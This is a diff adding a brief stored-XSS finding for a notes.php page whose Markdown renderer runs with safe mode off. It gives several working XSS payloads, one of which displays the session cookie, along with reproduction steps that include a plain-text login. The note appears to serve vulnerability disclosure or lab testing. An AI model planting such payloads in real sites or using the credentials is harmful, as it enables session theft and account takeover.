@@ -1,0 +1,15 @@
+Stored XSS in notes.php (note content rendered by Parsedown with safe mode OFF).
+
+Proof payload (put in note CONTENT, not title):
+  <img src=x onerror="alert(document.cookie)">
+
+Other payloads that also work:
+  <script>alert(1)</script>
+  <svg onload=alert(1)>
+  [click](javascript:alert(1))
+
+Steps:
+- Log in as maria / Maria123!
+- New note, content = payload above, Save
+- Opening the note runs the script (alert shows the session cookie)
+- Stored = it runs for ANY user who opens the note (e.g. admin)
